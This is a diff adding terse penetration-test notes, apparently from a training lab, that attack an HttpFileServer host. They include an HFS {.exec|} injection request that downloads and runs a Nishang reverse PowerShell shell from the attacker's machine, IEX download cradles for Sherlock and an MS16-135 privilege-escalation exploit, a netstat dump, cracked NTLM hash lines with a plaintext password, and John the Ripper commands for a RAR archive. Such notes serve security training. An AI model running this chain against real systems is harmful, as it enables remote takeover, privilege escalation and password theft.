@@ -1,0 +1,33 @@
+# 1 found HttpFileServer
+http://10.11.1.50:9505/
+
+# 2 using brup to get and activate PS shell by Nishang PStcp-shell where is hosted on kali
+HFS execute syntax: {.exec|command.}
+Shell: /Nishang/Shells/Invoke-PowerShellTcp.ps1
+GET /?search=%00{.exec|C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe+IEX+(New-Object+Net.WebClient).Downloadstring('http://192.168.119.194:9000/Invoke-PowerShellTcp.ps1').}
+
+# 3 transfer needed programs (modify ps script to call Find-AllVulns)
+IEX (New-Object Net.WebClient).Downloadstring('http://192.168.119.194:9000/Sherlock.ps1')
+
+# 4 found local vulnerabilties
+MS16-032 Secondary Logon Handle
+MS16-034 Windows Kernel-Mode Drivers EoP
+MS16-135 Win32k Elevation of Privileg
+
+# 5 found port 445 is open for internal use (winPEAS.bat)
+TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4                                                                      
+TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       632                                                                    
+TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4                                                                      
+TCP    0.0.0.0:9505           0.0.0.0:0              LISTENING       3364 
+
+# 6 find exploit base on MS16-135
+curl https://raw.githubusercontent.com/SecWiki/windows-kernel-exploits/master/MS16-135/MS16-135.ps1 > MS16-135.ps1
+IEX (New-Object Net.WebClient).Downloadstring('http://192.168.119.194:9000/MS16-135.ps1')
+
+# crack password
+alice:1001:B74242F37E47371AFF835A6EBCAC4FFE:aliceishere
+Bethany:1002:15A32E36E8612D886BE1B8981D9679EE:
+
+# crack employees.rar
+ar2john Employees.rar > Employees.hash
+john --format=rar --wordlist=/usr/share/wordlists/rockyou.txt Employees.hash
